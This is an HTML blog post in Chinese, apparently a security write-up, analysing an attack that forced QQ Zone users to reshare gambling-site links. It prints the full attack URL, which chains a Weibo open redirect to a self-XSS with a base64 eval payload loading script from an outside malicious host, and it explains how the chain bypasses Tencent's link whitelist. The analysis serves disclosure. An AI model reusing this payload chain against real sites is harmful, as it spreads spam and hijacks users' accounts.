@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"m09ic.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="本文原发于先知社区 https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6238 , 博客转自本人仅做备份用途 写在之前最近遇到多位老哥在骂,qq空间的链接一点就转发了一个封面为色情图片,内容为菠菜站的链接.我就好奇这难道是qq空间的XSS蠕虫?">
+<meta property="og:type" content="article">
+<meta property="og:title" content="QQ空间流氓转发分析">
+<meta property="og:url" content="https://m09ic.top/posts/6862/index.html">
+<meta property="og:site_name" content="M09ic&#39;s Blog">
+<meta property="og:description" content="本文原发于先知社区 https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6238 , 博客转自本人仅做备份用途 写在之前最近遇到多位老哥在骂,qq空间的链接一点就转发了一个封面为色情图片,内容为菠菜站的链接.我就好奇这难道是qq空间的XSS蠕虫?">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://m09ic.top/posts/6862/1.png">
+<meta property="og:image" content="https://m09ic.top/posts/6862/2.png">
+<meta property="og:image" content="https://m09ic.top/posts/6862/3.png">
+<meta property="og:image" content="https://m09ic.top/posts/6862/4.png">
+<meta property="article:published_time" content="2019-09-03T08:53:47.000Z">
+<meta property="article:modified_time" content="2021-01-04T14:52:57.751Z">
+<meta property="article:author" content="M09ic">
+<meta property="article:tag" content="漏洞分析">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://m09ic.top/posts/6862/1.png">
+
+<link rel="canonical" href="https://m09ic.top/posts/6862/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>QQ空间流氓转发分析 | M09ic's Blog</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-140303637-1"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-140303637-1');
+      }
+    </script>
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?04d80448a6c7bfee29f2e7379ff56865";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="M09ic's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">M09ic's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">独自行走于莽荒之地</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://m09ic.top/posts/6862/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="M09ic">
+      <meta itemprop="description" content="网络安全,编程学习记录的破地方">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M09ic's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          QQ空间流氓转发分析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-09-03 16:53:47" itemprop="dateCreated datePublished" datetime="2019-09-03T16:53:47+08:00">2019-09-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-01-04 22:52:57" itemprop="dateModified" datetime="2021-01-04T22:52:57+08:00">2021-01-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/posts/6862/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/posts/6862/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><em>本文原发于先知社区 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6238">https://xz.aliyun.com/t/6238</a> , 博客转自本人仅做备份用途</em></p>
+<h2 id="写在之前"><a href="#写在之前" class="headerlink" title="写在之前"></a>写在之前</h2><p>最近遇到多位老哥在骂,qq空间的链接一点就转发了一个封面为色情图片,内容为菠菜站的链接.我就好奇这难道是qq空间的XSS蠕虫?</p>
+<a id="more"></a>
+
+<p>BAT关键业务出了xss在9102年也不算小事情了,至少圈内会炸锅.但是一直没消息,直到我的好友也遭到了攻击.</p>
+<p>好奇之下,抓了个包分析.发现这是个有趣的攻击链,至少我没见过这种攻击方式.由一系列漏洞组成.</p>
+<p>中间一段时间忘了这事,前两天翻到给微博src提交的漏洞被打回.</p>
+<p><img src="1.png" alt="1"></p>
+<p>最后一部分转发的截图和代码忘了保留,见谅.不过这也是一个有趣的绕过qq安全机制的案例.</p>
+<p>(貌似之前看到过有人写过分析了,昨天去找的时候又没找到,于是我又自己分析了一遍)</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https%3A%2F%2Fweibo.cn%2Fsinaurl%3F_wv%3D1027%26cmd%3Dplay%26u%3Dhttps%253A%252F%252Fwww.whitedomin.com%252Fmember%252Findex.php%253Fgourl%253D%25252F%25252Fst.duanwenxue.com%25252Fpost-624.html%252522%25257d%252529%25257d%25252bwindow%25255b%252522eval%252522%25255d%252528atob%252528%252522ZG9jdW1lbnQud3JpdGUoIjxzY3JpcHQgc3JjPSdodHRwczovL2ltZy5kYWZlaWJsb2cuY29tL3dlYi9pZi5waHAnPjwvc2NyaXB0PiIp%252522%252529%252529%25252bfunction%252528%252529%25257b%2524.post%252528%25257b1%253A%252522%2526r%253D1561387991%2526business%253D%2523123</span><br></pre></td></tr></table></figure>
+<p>一步一步来分析.</p>
+<h3 id="微博任意url跳转"><a href="#微博任意url跳转" class="headerlink" title="微博任意url跳转"></a>微博任意url跳转</h3><p>已经提交给微博并被驳回,因此公开应该没什么问题.</p>
+<p>测试一下,将payload填到浏览器并用bp抓包,可以看到</p>
+<p><img src="2.png" alt="1"></p>
+<p>follow redirection 302跳转到了某白名单网站的网站</p>
+<h3 id="某白名单网站self-xss"><a href="#某白名单网站self-xss" class="headerlink" title="某白名单网站self-xss"></a>某白名单网站self-xss</h3><p>(虽然该漏洞已修复,但还是抹去相关信息)</p>
+<p>qq空间的分析链接是有验证的,虽然不知道具体验证机制,但是大致可以猜到是白名单验证.微博显然在白名单内,而且如果是302跳转会迭代验证,直到非302响应状态码.</p>
+<p>因此还需要个存在xss漏洞在白名单内的网站.</p>
+<p>因此黑产找了一个存在get请求的self-xss的网站,并且通过js再次进行跳转绕过检测机制.</p>
+<p><img src="3.png" alt="1"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.whitedomin.com&#x2F;member&#x2F;index.php?gourl&#x3D;%2F%2Fst.whitedomin.com%2Fpost-624.html%22%7d%29%7d%2bwindow%5b%22eval%22%5d%28atob%28%22ZG9jdW1lbnQud3JpdGUoIjxzY3JpcHQgc3JjPSdodHRwczovL2ltZy5kYWZlaWJsb2cuY29tL3dlYi9pZi5waHAnPjwvc2NyaXB0PiIp%22%29%29%2bfunction%28%29%7b$.post%28%7b1:%22&amp;r&#x3D;1561387991&amp;business&#x3D;#123</span><br></pre></td></tr></table></figure>
+<p>xss漏洞存在于该网站站内跳转的gourl参数,再次经过302跳转后同时指向了self-xss的js代码.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#125;)&#125;+window[&quot;eval&quot;](atob(&quot;ZG9jdW1lbnQud3JpdGUoIjxzY3JpcHQgc3JjPSdodHRwczovL2ltZy5kYWZlaWJsb2cuY29tL3dlYi9pZi5waHAnPjwvc2NyaXB0PiIp&quot;))+function()&#123;$.post(&#123;1:&quot;&amp;r&#x3D;1561387991&amp;business&#x3D;#123</span><br></pre></td></tr></table></figure>
+<p>base64解码:</p>
+<p><code>document.write(&quot;&lt;script src=&#39;https://img.dafeiblog.com/web/if.php&#39;&gt;&lt;/script&gt;&quot;)</code></p>
+<p>可以看到,再次跳转向了第三方的网站,绕过了腾讯的检测机制.</p>
+<h3 id="恶意域名执行转发"><a href="#恶意域名执行转发" class="headerlink" title="恶意域名执行转发"></a>恶意域名执行转发</h3><p>(因为当时在hw,只抽了几分钟大致看了一下,以为保留了该页面的恶意js代码,后来找的时候发现并没有,抱歉)</p>
+<p>(所以这一部分主要根据我的记忆以及猜想)</p>
+<p>该恶意网站伪造了腾讯拦截页面.</p>
+<p><img src="4.png" alt="1"></p>
+<p>因为腾讯的拦截页面并不显示url,所以普通用户很难发现是伪造的.</p>
+<p>该页面下镶嵌有恶意js代码,只有30-40行,大致是两个XHR请求的函数.</p>
+<p>猜测功能应该是跳转到博彩网站,以及请求腾讯空间转发接口.</p>
+<p>这时候手机端按返回键回到qq空间,就会有个弹窗,提示是否转发.选择不转发还会跳出来,强行结束qq进程才能停止弹窗.</p>
+<p>听说低qq版本或是低安卓版本没有这个提示框,会直接转发,(我并没有验证过)</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>利用链是这样的:</p>
+<p>微博任意url跳转 — 其他白名单内网站self-xss — 跳转至恶意网站执行恶意js </p>
+<p>这种绕过方法算是self-xss的新用法,用作绕过某些存在分享内容安全检测的应用.(至少我没见过)</p>
+<p>因为恶意网站js代码没有保存.因此并不知道是如何实现的qq空间转发功能以及无限循环转发弹窗.</p>
+<p>因为过程中并没有传输用户相关信息,只能猜测是qq提供了转发的api以供第三方应用调用,导致被黑产利用.</p>
+<p>可以参考下这两篇较早的文章,虽然利用思路完全不一样.</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/75711.html">https://www.freebuf.com/vuls/75711.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/144879.html">https://www.freebuf.com/column/144879.html</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>M09ic
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://m09ic.top/posts/6862/" title="QQ空间流氓转发分析">https://m09ic.top/posts/6862/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag"># 漏洞分析</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/7646/" rel="prev" title="三次AWD训练赛小结">
+      <i class="fa fa-chevron-left"></i> 三次AWD训练赛小结
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/50801/" rel="next" title="浙江CTF(ZJCTF) Quals Writeup">
+      浙江CTF(ZJCTF) Quals Writeup <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E4%B9%8B%E5%89%8D"><span class="nav-number">1.</span> <span class="nav-text">写在之前</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload"><span class="nav-number">2.1.</span> <span class="nav-text">payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BE%AE%E5%8D%9A%E4%BB%BB%E6%84%8Furl%E8%B7%B3%E8%BD%AC"><span class="nav-number">2.2.</span> <span class="nav-text">微博任意url跳转</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%90%E7%99%BD%E5%90%8D%E5%8D%95%E7%BD%91%E7%AB%99self-xss"><span class="nav-number">2.3.</span> <span class="nav-text">某白名单网站self-xss</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%81%B6%E6%84%8F%E5%9F%9F%E5%90%8D%E6%89%A7%E8%A1%8C%E8%BD%AC%E5%8F%91"><span class="nav-number">2.4.</span> <span class="nav-text">恶意域名执行转发</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">小结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">M09ic</p>
+  <div class="site-description" itemprop="description">网络安全,编程学习记录的破地方</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/M09Ic" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;M09Ic" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:m09ic@foxmail.com" title="E-Mail → mailto:m09ic@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://yml-sec.top/" title="https:&#x2F;&#x2F;yml-sec.top" rel="noopener" target="_blank">夜莫离</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://nightrainy.github.io/" title="https:&#x2F;&#x2F;nightrainy.github.io" rel="noopener" target="_blank">知世</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.360bug.net/" title="http:&#x2F;&#x2F;www.360bug.net" rel="noopener" target="_blank">孙德胜</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-paper-plane"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">M09ic</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'yP9ifyVVnh7znqRQVWNWn0V6-gzGzoHsz',
+      appKey     : 'k84kdIIIEt3b7F17XqEoBT22',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
